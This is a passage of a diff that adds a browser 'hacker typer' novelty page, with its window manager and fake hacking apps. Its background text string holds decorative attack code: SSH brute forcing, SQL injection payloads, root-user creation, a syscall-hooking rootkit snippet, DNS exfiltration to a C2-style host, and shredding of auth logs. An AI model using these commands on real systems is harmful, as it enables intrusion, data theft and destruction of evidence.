@@ -1,0 +1,1676 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Online Ethical Hacker Simulator</title>
+<meta name="description" content="Hacker Typer — Online Ethical Hacker Simulator. Type on your keyboard to simulate hacking.">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --green: #33ff33;
+    --green-dim: #1a8c1a;
+    --green-glow: 0 0 5px #33ff33, 0 0 10px #33ff3366;
+    --red: #ff3333;
+    --orange: #ff9900;
+    --bg: #000000;
+    --win-bg: #0d0d0d;
+    --win-border: #2a2a2a;
+    --titlebar-bg: #1a1a1a;
+    --titlebar-border: #333333;
+    --font: "Consolas", "Courier New", monospace;
+    --btn-bg: #1c1c1c;
+    --btn-border: #444;
+    --text-dim: #444;
+    --text-mid: #888;
+    --dock-w: 54px;
+  }
+
+  html, body {
+    width: 100vw; height: 100vh;
+    overflow: hidden;
+    background: var(--bg);
+    font-family: var(--font);
+    color: var(--green);
+    user-select: none;
+    cursor: default;
+  }
+
+  /* ─── SCANLINE OVERLAY ─── */
+  body::before {
+    content: '';
+    position: fixed; inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,0,0,0.03) 2px,
+      rgba(0,0,0,0.03) 4px
+    );
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  /* ─── BACKGROUND TERMINAL ─── */
+  #bg-terminal {
+    position: fixed;
+    top: 0; left: 0;
+    right: var(--dock-w);
+    bottom: 20px;
+    padding: 6px 10px 6px 8px;
+    font-size: 13px;
+    line-height: 1.45;
+    color: var(--green);
+    overflow: hidden;
+    white-space: pre-wrap;
+    word-break: break-all;
+    pointer-events: none;
+    z-index: 0;
+    text-shadow: var(--green-glow);
+    opacity: 0.65;
+  }
+
+  /* ─── INTRO OVERLAY ─── */
+  #intro {
+    position: fixed; inset: 0;
+    right: var(--dock-w);
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    z-index: 5; pointer-events: none;
+    transition: opacity 0.8s ease;
+    text-align: center; padding: 20px;
+  }
+  #intro.hidden { opacity: 0; }
+  #intro h1 {
+    font-size: 26px; font-weight: 700;
+    color: var(--green);
+    text-shadow: var(--green-glow);
+    letter-spacing: 1px; margin-bottom: 14px;
+    line-height: 1.3;
+  }
+  #intro p {
+    font-size: 13px; color: #888;
+    max-width: 480px; line-height: 1.7;
+  }
+  #btn-fullscreen {
+    margin-top: 22px;
+    padding: 7px 20px;
+    background: var(--btn-bg);
+    border: 1px solid var(--btn-border);
+    color: var(--green);
+    font-family: var(--font); font-size: 12px;
+    cursor: pointer; pointer-events: all;
+    letter-spacing: 1px;
+    transition: background 0.15s, border-color 0.15s;
+  }
+  #btn-fullscreen:hover { background: #2a2a2a; border-color: var(--green); }
+
+  /* ─── RIGHT DOCK ─── */
+  #dock {
+    position: fixed; right: 0; top: 0; bottom: 20px;
+    width: var(--dock-w);
+    display: flex; flex-direction: column;
+    z-index: 800;
+    background: #080808;
+    border-left: 1px solid #1e1e1e;
+    padding: 4px 0;
+    overflow: hidden;
+  }
+  .dock-icon {
+    width: 54px; min-height: 52px;
+    flex: 0 0 auto;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    gap: 3px;
+    cursor: pointer;
+    border: none; background: none;
+    color: var(--green); font-family: var(--font);
+    font-size: 10px; letter-spacing: 0.5px;
+    transition: background 0.15s, filter 0.15s;
+    padding: 6px 2px;
+    border-bottom: 1px solid #111;
+  }
+  .dock-icon:hover { background: #141414; filter: brightness(1.5); }
+  .dock-icon:active { background: #1a1a1a; }
+  .dock-icon .di-glyph { font-size: 18px; line-height: 1; }
+  .dock-icon .di-label { font-size: 7.5px; color: #666; text-align: center; letter-spacing: 0.3px; }
+
+  /* ─── BOTTOM TASKBAR ─── */
+  #taskbar {
+    position: fixed; bottom: 0; left: 0; right: var(--dock-w);
+    height: 20px;
+    background: #050505;
+    border-top: 1px solid #1a1a1a;
+    display: flex; align-items: center;
+    z-index: 800;
+  }
+  #btn-start {
+    height: 100%;
+    padding: 0 12px;
+    background: #0f0f0f; border: none;
+    border-right: 1px solid #222;
+    color: #777; font-family: var(--font); font-size: 11px;
+    cursor: pointer;
+    transition: background 0.15s;
+  }
+  #btn-start:hover { background: #1a1a1a; color: #bbb; }
+  #key-hints {
+    display: flex; align-items: center;
+    padding: 0 6px; gap: 0;
+    font-size: 9px; color: #333; font-family: var(--font);
+    flex: 1;
+  }
+  .key-hint {
+    padding: 0 5px; cursor: pointer;
+    transition: color 0.1s; height: 100%;
+    display: flex; align-items: center;
+  }
+  .key-hint:hover { color: #666; }
+  #clock {
+    padding: 0 8px;
+    font-size: 9px; color: #333;
+    border-left: 1px solid #1a1a1a;
+    white-space: nowrap;
+  }
+
+  /* ─── WINDOW CHROME ─── */
+  .win {
+    position: fixed;
+    background: var(--win-bg);
+    border: 1px solid var(--win-border);
+    font-family: var(--font);
+    color: var(--green);
+    min-width: 220px; min-height: 80px;
+    display: flex; flex-direction: column;
+    z-index: 100;
+    box-shadow: 0 8px 48px rgba(0,0,0,0.95), 0 0 0 0.5px #33ff3311;
+  }
+  .win.focused { z-index: 200; border-color: #3a3a3a; }
+  .win-titlebar {
+    display: flex; align-items: center;
+    background: var(--titlebar-bg);
+    border-bottom: 1px solid var(--titlebar-border);
+    padding: 0 6px; height: 24px;
+    cursor: move; flex-shrink: 0;
+    gap: 5px;
+  }
+  .win-title-icon { font-size: 12px; flex-shrink: 0; }
+  .win-title-text {
+    flex: 1; font-size: 10.5px; letter-spacing: 0.5px;
+    color: #ccc; white-space: nowrap; overflow: hidden;
+    text-overflow: ellipsis;
+  }
+  .win-controls { display: flex; gap: 2px; flex-shrink: 0; }
+  .win-btn {
+    width: 18px; height: 15px; background: #1c1c1c;
+    border: 1px solid #3a3a3a; color: #888;
+    font-family: var(--font); font-size: 10px;
+    cursor: pointer; display: flex; align-items: center; justify-content: center;
+    line-height: 1; padding: 0;
+    transition: background 0.1s, color 0.1s;
+  }
+  .win-btn:hover { background: #2e2e2e; color: #fff; }
+  .win-btn.close:hover { background: #3d0000; color: var(--red); border-color: #660000; }
+  .win-body {
+    flex: 1; overflow: hidden;
+    font-size: 12px; padding: 10px 12px;
+    display: flex; flex-direction: column; gap: 7px;
+  }
+
+  /* ─── GENERIC UI ─── */
+  .green-text { color: var(--green); text-shadow: var(--green-glow); }
+  .red-text { color: var(--red); text-shadow: 0 0 5px var(--red); }
+  .orange-text { color: var(--orange); }
+  .dim-text { color: var(--text-dim); }
+  .mid-text { color: var(--text-mid); }
+
+  .hk-btn {
+    display: inline-block;
+    padding: 5px 14px;
+    background: var(--btn-bg);
+    border: 1px solid var(--btn-border);
+    color: var(--green); font-family: var(--font); font-size: 11px;
+    cursor: pointer; letter-spacing: 1px;
+    transition: background 0.15s, border-color 0.15s;
+    text-align: center; white-space: nowrap;
+  }
+  .hk-btn:hover { background: #252525; border-color: #555; }
+  .hk-btn:active { background: #2a2a2a; }
+  .hk-btn:disabled { opacity: 0.4; cursor: default; }
+  .hk-btn.red { color: var(--red); border-color: #440000; }
+  .hk-btn.red:hover { border-color: var(--red); background: #1a0000; }
+
+  .prog-track {
+    height: 9px; background: #080808; border: 1px solid #222;
+    position: relative; overflow: hidden;
+  }
+  .prog-fill {
+    height: 100%; background: var(--green);
+    box-shadow: 0 0 6px var(--green);
+    transition: width 0.18s linear;
+  }
+
+  .data-table { border-collapse: collapse; width: 100%; font-size: 11px; }
+  .data-table th, .data-table td {
+    border: 1px solid #1e1e1e; padding: 3px 8px;
+    text-align: right; font-family: var(--font);
+  }
+  .data-table th { background: #0a0a0a; color: #555; font-weight: normal; letter-spacing: 0.5px; }
+  .data-table td { color: var(--green); }
+  .data-table td:first-child, .data-table th:first-child { text-align: left; }
+  .data-table tr.sum-row td { border-top: 1px solid #333; color: #aaa; }
+
+  .log-scroll {
+    overflow-y: auto; flex: 1;
+    background: #040404; border: 1px solid #141414;
+    padding: 5px 8px;
+    font-size: 11px; line-height: 1.6;
+    scrollbar-width: thin; scrollbar-color: #222 #080808;
+  }
+  .log-scroll p { margin: 0; }
+  .log-scroll .lg { color: var(--green); text-shadow: var(--green-glow); }
+  .log-scroll .lr { color: var(--red); }
+  .log-scroll .lw { color: #ddd; }
+  .log-scroll .ld { color: #444; }
+  .log-scroll .lo { color: var(--orange); }
+
+  /* ─── PASSIVE WINDOWS ─── */
+  .passive-center {
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    text-align: center; height: 100%; padding: 14px; gap: 10px;
+  }
+  .big-num {
+    font-size: 52px; font-weight: 700; letter-spacing: 4px;
+    color: var(--red); text-shadow: 0 0 24px var(--red), 0 0 4px var(--red);
+    font-family: var(--font);
+  }
+  .stamp-box {
+    border: 4px solid var(--red);
+    padding: 6px 18px; transform: rotate(-12deg);
+    font-size: 20px; font-weight: 700; letter-spacing: 5px;
+    color: var(--red); text-shadow: 0 0 12px var(--red);
+    display: inline-block; margin: 6px 0;
+  }
+
+  /* ─── ACCESS DENIED ─── */
+  .access-denied-box {
+    background: #0b0000;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    height: 100%; padding: 18px; gap: 8px;
+    animation: denyPulse 1.2s ease-in-out infinite;
+  }
+  @keyframes denyPulse {
+    0%,100% { box-shadow: inset 0 0 40px rgba(255,0,0,0.08); }
+    50% { box-shadow: inset 0 0 80px rgba(255,0,0,0.18); }
+  }
+  .deny-icon { font-size: 48px; color: var(--red); text-shadow: 0 0 20px var(--red); }
+  .deny-title { font-size: 18px; font-weight: 700; color: var(--red); letter-spacing: 3px; text-shadow: 0 0 12px var(--red); }
+  .deny-sub { font-size: 10px; color: #aa3333; letter-spacing: 0.5px; max-width: 250px; line-height: 1.6; }
+
+  /* ─── PASSWORD CRACKER ─── */
+  .crack-tabs { display: flex; border-bottom: 1px solid #222; margin-bottom: 7px; }
+  .crack-tab {
+    padding: 3px 12px; font-size: 11px; cursor: pointer;
+    background: #0a0a0a; border: 1px solid #1e1e1e;
+    border-bottom: none; color: #555;
+    margin-right: 2px;
+    transition: color 0.1s;
+  }
+  .crack-tab.active { background: var(--win-bg); color: var(--green); border-color: #333; }
+  .crack-grid {
+    display: grid; grid-template-columns: repeat(7, 1fr);
+    gap: 3px; margin: 4px 0;
+  }
+  .crack-cell {
+    height: 20px; background: #080808;
+    border: 1px solid #222;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 12px; color: #333; transition: all 0.2s;
+  }
+  .crack-cell.done { color: var(--green); border-color: #1a4a1a; background: #001500; }
+
+  /* ─── INTERPOL ─── */
+  .suspect-row {
+    display: flex; align-items: center; gap: 10px;
+    padding: 6px 4px; border-bottom: 1px solid #111;
+    cursor: pointer; transition: background 0.1s;
+  }
+  .suspect-row:hover { background: #0d0d0d; }
+  .suspect-avatar {
+    width: 36px; height: 46px; background: #111;
+    border: 1px solid #2a2a2a; display: flex; align-items: center;
+    justify-content: center; font-size: 20px; flex-shrink: 0;
+  }
+  .suspect-info { font-size: 10.5px; color: #888; }
+  .suspect-info .suspect-name { color: var(--green); font-size: 11.5px; margin-bottom: 2px; }
+
+  /* ─── SATELLITE ─── */
+  .sat-phase { display: none; }
+  .sat-phase.active { display: flex; flex-direction: column; align-items: center; gap: 8px; }
+
+  /* ─── NUCLEAR ─── */
+  .rod-grid { display: grid; grid-template-columns: repeat(6, 1fr); gap: 3px; margin: 4px 0; }
+  .rod-cell {
+    height: 36px; background: #080e08;
+    border: 1px solid #122312;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 8px; color: #1a3a1a; transition: all 0.4s;
+  }
+  .rod-cell.hot { background: #120800; border-color: #884400; color: #884400; }
+  .rod-cell.critical { background: #120000; border-color: var(--red); color: var(--red); animation: critBlink 0.5s step-end infinite; }
+
+  /* ─── REMOTE TERMINAL ─── */
+  .remote-terminal {
+    flex: 1; background: #020202;
+    overflow-y: auto; padding: 8px;
+    font-size: 12px; line-height: 1.55;
+    scrollbar-width: thin; scrollbar-color: #222 #050505;
+  }
+  .remote-terminal p { margin: 0; color: var(--green); text-shadow: var(--green-glow); }
+  .remote-terminal .rt-dim { color: #555; }
+  .remote-terminal .rt-warn { color: var(--red); }
+
+  /* ─── DOWNLOAD ─── */
+  .dl-file-row { display: flex; align-items: center; gap: 7px; padding: 3px 0; border-bottom: 1px solid #111; }
+  .dl-file-name { flex: 1; font-size: 10.5px; color: #999; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+  .dl-file-pct { font-size: 10.5px; color: var(--green); width: 32px; text-align: right; flex-shrink: 0; }
+
+  /* ─── IP LOCATOR ─── */
+  .loc-phase { display: none; flex-direction: column; align-items: center; gap: 8px; }
+  .loc-phase.active { display: flex; }
+
+  /* ─── RESIZE ─── */
+  .resize-handle {
+    position: absolute; bottom: 0; right: 0;
+    width: 12px; height: 12px; cursor: se-resize;
+    background: linear-gradient(135deg, transparent 50%, #2a2a2a 50%);
+  }
+
+  /* ─── ANIMATIONS ─── */
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+  @keyframes critBlink { 0%,100%{opacity:1} 50%{opacity:0.2} }
+  @keyframes pulse { 0%,100%{opacity:0.7} 50%{opacity:1} }
+  @keyframes fadeIn { from{opacity:0;transform:translateY(-4px)} to{opacity:1;transform:translateY(0)} }
+
+  .blink { animation: blink 1s step-end infinite; }
+  .pulse { animation: pulse 2s ease-in-out infinite; }
+  .win { animation: fadeIn 0.15s ease-out; }
+
+  /* ─── CCTV ─── */
+  .cam-cell {
+    background: #030303; border: 1px solid #141414;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    aspect-ratio: 4/3; position: relative;
+    overflow: hidden;
+  }
+  .cam-cell::before {
+    content: '';
+    position: absolute; inset: 0;
+    background: repeating-linear-gradient(
+      0deg, transparent, transparent 3px,
+      rgba(51,255,51,0.015) 3px, rgba(51,255,51,0.015) 4px
+    );
+    pointer-events: none;
+  }
+  .cam-static {
+    position: absolute; inset: 0;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 150' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.06'/%3E%3C/svg%3E");
+    opacity: 0.4;
+  }
+
+  /* ─── DEALS ─── */
+  .deal-row { display:flex; gap:8px; padding:5px 4px; border-bottom:1px solid #0f0f0f; align-items:center; transition: background 0.1s; }
+  .deal-row:hover { background: #0a0a0a; }
+
+  /* ─── MINI INFO GRID ─── */
+  .info-grid { display:grid; grid-template-columns:auto 1fr; gap:2px 10px; font-size:11px; }
+  .info-grid .ig-label { color: var(--text-mid); white-space: nowrap; }
+  .info-grid .ig-val { color: var(--green); }
+</style>
+</head>
+<body>
+
+<!-- BACKGROUND TERMINAL -->
+<div id="bg-terminal"></div>
+
+<!-- INTRO OVERLAY -->
+<div id="intro">
+  <h1>Online Ethical Hacker Simulator</h1>
+  <p>Start typing random text on your keyboard to simulate that you're hacking a computer.</p>
+  <button id="btn-fullscreen" onclick="goFullscreen()">⤢ Automate Full Screen</button>
+</div>
+
+<!-- RIGHT DOCK -->
+<div id="dock">
+  <button class="dock-icon" onclick="openApp('remote')" title="Remote Connection [SSH]">
+    <span class="di-glyph">⌨</span>
+    <span class="di-label">Remote</span>
+  </button>
+  <button class="dock-icon" onclick="openApp('miner')" title="Bitcoin Miner">
+    <span class="di-glyph">₿</span>
+    <span class="di-label">Miner</span>
+  </button>
+  <button class="dock-icon" onclick="openApp('crack')" title="Password Cracker">
+    <span class="di-glyph">🔓</span>
+    <span class="di-label">Crack</span>
+  </button>
+  <button class="dock-icon" onclick="openApp('sat')" title="Satellite Uplink">
+    <span class="di-glyph">🛰</span>
+    <span class="di-label">Satcom</span>
+  </button>
+  <button class="dock-icon" onclick="openApp('cctv')" title="CCTV Surveillance">
+    <span class="di-glyph">📷</span>
+    <span class="di-label">CCTV</span>
+  </button>
+  <button class="dock-icon" onclick="openApp('nuclear')" title="Nuclear Plant">
+    <span class="di-glyph">⚛</span>
+    <span class="di-label">Reactor</span>
+  </button>
+  <button class="dock-icon" onclick="openApp('interpol')" title="Interpol Database">
+    <span class="di-glyph">🎯</span>
+    <span class="di-label">Interpol</span>
+  </button>
+  <button class="dock-icon" onclick="openApp('deals')" title="Dark Market Deals">
+    <span class="di-glyph">💸</span>
+    <span class="di-label">Deals</span>
+  </button>
+</div>
+
+<!-- TASKBAR -->
+<div id="taskbar">
+  <button id="btn-start" onclick="openApp('remote')">≡ Start</button>
+  <div id="key-hints">
+    <span class="key-hint" onclick="openPassive(1)" title="Access Denied">[1]</span>
+    <span class="key-hint" onclick="openPassive(2)" title="Permission Granted">[2]</span>
+    <span class="key-hint" onclick="openPassive(3)" title="Self Destruct">[3]</span>
+    <span class="key-hint" onclick="openPassive(4)" title="Classified">[4]</span>
+    <span class="key-hint" onclick="openPassive(5)" title="Neural Network">[5]</span>
+    <span class="key-hint" onclick="openPassive(6)" title="Compiling">[6]</span>
+    <span class="key-hint" onclick="openPassive(7)" title="Install Malware">[7]</span>
+    <span class="key-hint" onclick="openPassive(8)" title="Download Data">[8]</span>
+    <span class="key-hint" onclick="openPassive(9)" title="Satellite">[9]</span>
+    <span class="key-hint" onclick="openPassive(0)" title="IP Locator">[0]</span>
+  </div>
+  <div id="clock">--:--:--</div>
+</div>
+
+<!-- WINDOWS CONTAINER -->
+<div id="win-container"></div>
+
+<script>
+/* ═══════════════════════════════════════════════════════════
+   HACKER TYPER SIMULATOR — Core Engine
+   ═══════════════════════════════════════════════════════════ */
+
+/* ── CODE CORPUS (background terminal) ── */
+const CODE_CORPUS = `#!/usr/bin/env python3
+import os, sys, socket, struct, hashlib, threading, subprocess, time
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+
+TARGET_IP = "185.220.101.47"
+TARGET_PORT = 22
+MAX_THREADS = 256
+SESSION_KEY = os.urandom(32)
+
+class ExploitEngine:
+    def __init__(self, target, port=22):
+        self.target = target
+        self.port = port
+        self.sock = None
+        self.session_key = os.urandom(32)
+        self.iv = os.urandom(16)
+        self.connected = False
+
+    def establish_connection(self):
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.settimeout(8)
+        self.sock.connect((self.target, self.port))
+        self.connected = True
+        return self._handshake()
+
+    def _handshake(self):
+        banner = self.sock.recv(1024)
+        payload = b"SSH-2.0-OpenSSH_8.9p1 Ubuntu\\r\\n"
+        self.sock.send(payload)
+        return True
+
+    def inject_payload(self, shellcode):
+        cipher = Cipher(
+            algorithms.AES(self.session_key),
+            modes.CBC(self.iv),
+            backend=default_backend()
+        )
+        encryptor = cipher.encryptor()
+        padded = shellcode + b'\\x00' * (16 - len(shellcode) % 16)
+        return encryptor.update(padded) + encryptor.finalize()
+
+    def escalate_privileges(self):
+        cmds = [
+            "sudo -n /bin/bash -i",
+            "echo 0 > /proc/sys/kernel/dmesg_restrict",
+            "insmod /tmp/rootkit.ko",
+            "chmod 777 /etc/shadow",
+            "useradd -m -s /bin/bash -u 0 -o ghost"
+        ]
+        for cmd in cmds:
+            self.sock.send(cmd.encode() + b'\\n')
+            resp = self.sock.recv(4096)
+            if b"Permission denied" not in resp:
+                return True
+        return False
+
+def brute_force_ssh(ip, wordlist="/usr/share/wordlists/rockyou.txt"):
+    with open(wordlist, 'r', errors='ignore') as f:
+        passwords = f.readlines()
+    for i, pwd in enumerate(passwords):
+        pwd = pwd.strip()
+        try:
+            e = ExploitEngine(ip)
+            if e.establish_connection():
+                e.sock.send(f"root:{pwd}\\n".encode())
+                resp = e.sock.recv(1024)
+                if b"Welcome" in resp or b"root@" in resp:
+                    print(f"[+] CRACKED: root:{pwd}")
+                    return pwd
+        except:
+            continue
+        if i % 500 == 0:
+            print(f"[*] Tried {i} passwords, current: {pwd}")
+    return None
+
+class NetworkScanner:
+    PORTS = [21,22,23,25,53,80,110,135,139,143,443,445,993,3306,3389,5900,8080]
+
+    def __init__(self, subnet):
+        self.subnet = subnet
+        self.results = {}
+
+    def scan_host(self, ip):
+        open_ports = []
+        for port in self.PORTS:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(0.4)
+                if s.connect_ex((str(ip), port)) == 0:
+                    open_ports.append(port)
+                s.close()
+            except:
+                pass
+        if open_ports:
+            self.results[str(ip)] = open_ports
+            print(f"[+] {ip}: {open_ports}")
+
+    def run(self):
+        threads = []
+        for i in range(1, 255):
+            ip = f"{self.subnet}.{i}"
+            t = threading.Thread(target=self.scan_host, args=(ip,))
+            threads.append(t)
+            t.start()
+            if len(threads) >= MAX_THREADS:
+                for th in threads: th.join()
+                threads = []
+        for th in threads: th.join()
+        return self.results
+
+def inject_sql(url, param, payload_type="union"):
+    payloads = {
+        "union": "' UNION SELECT username,password,3,4,5 FROM users--",
+        "blind": "' AND SLEEP(5)--",
+        "error": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
+        "stacked": "'; DROP TABLE users; INSERT INTO users VALUES('admin','h4ck3d')--"
+    }
+    target_url = f"{url}?{param}={payloads.get(payload_type, payloads['union'])}"
+    print(f"[SQLI] Targeting: {target_url}")
+    return target_url
+
+class RootkitInstaller:
+    MODULE = "nexus_rk.ko"
+
+    def compile(self):
+        src = """
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/syscalls.h>
+MODULE_LICENSE("GPL");
+unsigned long *sys_call_table;
+asmlinkage int (*orig_open)(const char*, int, mode_t);
+asmlinkage int hook_open(const char *path, int flags, mode_t mode) {
+    if (strncmp(path, "/proc/nexus", 11) == 0) return -ENOENT;
+    return orig_open(path, flags, mode);
+}
+"""
+        with open("/tmp/rootkit.c", "w") as f:
+            f.write(src)
+        subprocess.run(["make", "-C", "/lib/modules/$(uname -r)/build", "M=/tmp", "modules"])
+
+    def install(self):
+        self.compile()
+        subprocess.run(["insmod", f"/tmp/{self.MODULE}"])
+
+class DNSTunnel:
+    def __init__(self, domain, ns_server):
+        self.domain = domain
+        self.ns = ns_server
+
+    def encode_chunk(self, data):
+        import base64
+        return base64.b32encode(data).decode().lower().rstrip('=')
+
+    def exfiltrate(self, payload):
+        chunks = [payload[i:i+30] for i in range(0, len(payload), 30)]
+        for i, chunk in enumerate(chunks):
+            label = self.encode_chunk(chunk.encode())
+            query = f"{i}.{label}.{self.domain}"
+            try:
+                socket.getaddrinfo(query, None, proto=socket.IPPROTO_UDP)
+            except:
+                pass
+            print(f"[DNS] Chunk {i}/{len(chunks)} exfiltrated")
+
+if __name__ == "__main__":
+    print("[NEXUS] Initializing exploit framework v4.2.1")
+    print("[NEXUS] Loading kernel bypass modules...")
+    print("[NEXUS] AES-256 session cipher: ACTIVE")
+    scanner = NetworkScanner("192.168.1")
+    scanner.run()
+    engine = ExploitEngine(TARGET_IP)
+    if engine.establish_connection():
+        print("[+] Connection established to target")
+        engine.escalate_privileges()
+        rk = RootkitInstaller()
+        rk.install()
+        tunnel = DNSTunnel("c2.nexus-ops.net", "8.8.8.8")
+        tunnel.exfiltrate("TOP_SECRET_PAYLOAD_ACTIVE")
+    print("[NEXUS] Operation complete. Cleaning traces...")
+    subprocess.run(["history", "-c"])
+    subprocess.run(["shred", "-u", "/var/log/auth.log"])
+    os.remove(sys.argv[0])
+`;
+
+let bgIndex = 0;
+const bgEl = document.getElementById('bg-terminal');
+
+/* Render background terminal text (keeps last N lines visible) */
+function bgAppend(text) {
+  bgEl.textContent += text;
+  // Keep from growing too large — trim to last 6000 chars
+  if (bgEl.textContent.length > 6000) {
+    bgEl.textContent = bgEl.textContent.slice(-5000);
+  }
+}
+
+/* Auto-trickle (slow ambient) */
+let bgTrickleInterval = setInterval(() => {
+  const chunk = CODE_CORPUS.slice(bgIndex, bgIndex + 2);
+  bgAppend(chunk);
+  bgIndex = (bgIndex + 2) % CODE_CORPUS.length;
+}, 80);
+
+/* Keypress burst */
+function bgBurst(n) {
+  const chunk = CODE_CORPUS.slice(bgIndex, bgIndex + n);
+  bgAppend(chunk);
+  bgIndex = (bgIndex + n) % CODE_CORPUS.length;
+}
+
+/* ── INTRO ── */
+let introHidden = false;
+function hideIntro() {
+  if (!introHidden) {
+    introHidden = true;
+    const intro = document.getElementById('intro');
+    intro.classList.add('hidden');
+    setTimeout(() => intro.style.display = 'none', 900);
+  }
+}
+
+/* ── FULLSCREEN ── */
+function goFullscreen() {
+  document.documentElement.requestFullscreen?.().catch(() => {});
+}
+
+/* ── CLOCK ── */
+const clockEl = document.getElementById('clock');
+function updateClock() {
+  clockEl.textContent = new Date().toLocaleTimeString('en-GB', {hour:'2-digit',minute:'2-digit',second:'2-digit'});
+}
+updateClock();
+setInterval(updateClock, 1000);
+
+/* ═══════════════════════════════════════
+   WINDOW MANAGER
+   ═══════════════════════════════════════ */
+let topZ = 200;
+const openWindows = {};
+const minimizedWins = {};
+
+function bringToFront(id) {
+  topZ++;
+  const el = document.getElementById(id);
+  if (el) { el.style.zIndex = topZ; el.classList.add('focused'); }
+  Object.keys(openWindows).forEach(k => {
+    if (k !== id) document.getElementById(k)?.classList.remove('focused');
+  });
+}
+
+function closeWin(id) {
+  const el = document.getElementById(id);
+  if (el) { el.remove(); delete openWindows[id]; delete minimizedWins[id]; }
+}
+
+function minimizeWin(id) {
+  const el = document.getElementById(id);
+  if (!el) return;
+  if (minimizedWins[id]) {
+    el.style.visibility = 'visible';
+    minimizedWins[id] = false;
+  } else {
+    el.style.visibility = 'hidden';
+    minimizedWins[id] = true;
+  }
+}
+
+function maximizeWin(id) {
+  const el = document.getElementById(id);
+  if (!el) return;
+  if (el.dataset.maxed === '1') {
+    el.style.cssText = el.dataset.prevStyle;
+    el.dataset.maxed = '0';
+  } else {
+    el.dataset.prevStyle = el.style.cssText;
+    el.style.cssText = `left:0;top:0;width:calc(100vw - ${parseInt(getComputedStyle(document.documentElement).getPropertyValue('--dock-w'))||54}px);height:calc(100vh - 20px);z-index:${++topZ}`;
+    el.dataset.maxed = '1';
+  }
+}
+
+function makeWin({ id, title, glyph = '▣', w = 420, h = 320, x, y, content }) {
+  if (openWindows[id]) { bringToFront(id); return null; }
+  const dockW = 54;
+  const taskH = 20;
+  const maxX = Math.max(0, window.innerWidth - dockW - w);
+  const maxY = Math.max(0, window.innerHeight - taskH - h);
+  const cx = x ?? (40 + Math.floor(Math.random() * Math.min(maxX, 300)));
+  const cy = y ?? (30 + Math.floor(Math.random() * Math.min(maxY, 200)));
+
+  const win = document.createElement('div');
+  win.id = id; win.className = 'win';
+  win.style.cssText = `left:${cx}px;top:${cy}px;width:${w}px;height:${h}px;z-index:${++topZ}`;
+
+  win.innerHTML = `
+    <div class="win-titlebar">
+      <span class="win-title-icon">${glyph}</span>
+      <span class="win-title-text">${title}</span>
+      <div class="win-controls">
+        <button class="win-btn" onclick="minimizeWin('${id}')" title="Minimize">_</button>
+        <button class="win-btn" onclick="maximizeWin('${id}')" title="Maximize">□</button>
+        <button class="win-btn close" onclick="closeWin('${id}')" title="Close">✕</button>
+      </div>
+    </div>
+    <div class="win-body" id="${id}-body">${content}</div>
+    <div class="resize-handle" id="${id}-rh"></div>
+  `;
+
+  document.getElementById('win-container').appendChild(win);
+  openWindows[id] = true;
+  makeDraggable(win);
+  makeResizable(win, document.getElementById(id + '-rh'));
+  bringToFront(id);
+  return win;
+}
+
+/* ── DRAG ── */
+function makeDraggable(winEl) {
+  const titlebar = winEl.querySelector('.win-titlebar');
+  let ox, oy, sx, sy;
+  titlebar.addEventListener('mousedown', e => {
+    if (e.target.closest('.win-controls')) return;
+    bringToFront(winEl.id);
+    ox = winEl.offsetLeft; oy = winEl.offsetTop;
+    sx = e.clientX; sy = e.clientY;
+    const onMove = ev => {
+      winEl.style.left = Math.max(0, ox + ev.clientX - sx) + 'px';
+      winEl.style.top  = Math.max(0, oy + ev.clientY - sy) + 'px';
+    };
+    const onUp = () => {
+      document.removeEventListener('mousemove', onMove);
+      document.removeEventListener('mouseup', onUp);
+    };
+    document.addEventListener('mousemove', onMove);
+    document.addEventListener('mouseup', onUp);
+    e.preventDefault();
+  });
+  winEl.addEventListener('mousedown', () => bringToFront(winEl.id));
+}
+
+/* ── RESIZE ── */
+function makeResizable(winEl, handle) {
+  if (!handle) return;
+  handle.addEventListener('mousedown', e => {
+    const sw = winEl.offsetWidth, sh = winEl.offsetHeight;
+    const sx = e.clientX, sy = e.clientY;
+    const onMove = ev => {
+      winEl.style.width  = Math.max(220, sw + ev.clientX - sx) + 'px';
+      winEl.style.height = Math.max(100, sh + ev.clientY - sy) + 'px';
+    };
+    const onUp = () => {
+      document.removeEventListener('mousemove', onMove);
+      document.removeEventListener('mouseup', onUp);
+    };
+    document.addEventListener('mousemove', onMove);
+    document.addEventListener('mouseup', onUp);
+    e.preventDefault(); e.stopPropagation();
+  });
+}
+
+/* ── HELPERS ── */
+function rip() { return `${r(10,220)}.${r(1,254)}.${r(0,254)}.${r(1,254)}`; }
+function r(a, b) { return Math.floor(Math.random() * (b - a + 1)) + a; }
+function rbtc() { return (Math.random() * 0.0038 + 0.0002).toFixed(6); }
+function hex(n) { return n.toString(16).padStart(n>255?4:2,'0'); }
+
+/* ═══════════════════════════════════════
+   INTERACTIVE APPS
+   ═══════════════════════════════════════ */
+
+function openApp(name) {
+  hideIntro();
+  switch(name) {
+    case 'miner':    openMiner();    break;
+    case 'crack':    openCracker();  break;
